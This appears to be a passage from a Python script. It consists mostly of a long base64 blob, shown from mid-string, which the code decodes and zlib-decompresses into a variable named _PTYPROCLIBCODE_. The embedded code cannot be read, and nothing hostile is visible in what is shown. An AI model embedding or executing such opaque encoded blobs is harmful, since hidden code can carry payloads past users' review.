QC+eKAqJVD4kynauRb+DX/C6msKp96rE7q9Qrf7sZPZ3NJLj5IuTbnV746G78B2xorsqZ8YnwsVmmVqXNccnKTncKOjaWcw14/pJmbzlJf5UON2xpXFXFw7pZK4m44dbQqkqP3fPe9/kqpOZ1aor+vynzlAPV18Jy5i6HV3uYe2YMnK+Au7opSx8YT1FqfCYjjAK7RrvkiBc1xHnCJvG0gettaK4rFr1x4uv0rIp7qr4g4PPj2wb2Hv3546Jxm0veFDwfmP/vsRzxQ3vnKB9NOakeh731oB+YMvsm9AT6Gbw+O7r3zNgu4c+z4whAH5qT1dNT6hpHB5pdPvOJuscBeUWDbh1D53wcBnzq+hMB/RjWi8ak3wEU3VVod8cbh274NYGS+dODYHO5CX204oe0m1fEQh5rVQ4cGFG4GGzPjYyTwqA81kDlyylfd9ksO9J+tw/Wd4ekgXPuxfbY73iv1MxXuz0rzWUn7QONM3Q70KGGgpuRCDHfuNJ7iYmyfOUPwekvd5JBCSB+mg+1Y2M+kv7rg1lbFHTFoNfr9HAy8Vq02BvrcDm81N8fbjqhpMftvXknWqg=="
    _PTYPROCLIBCODE_ = zlib.decompress(base64.b64decode(_PTYPROCLIB_))

if __name__ == "__main__":
    main()
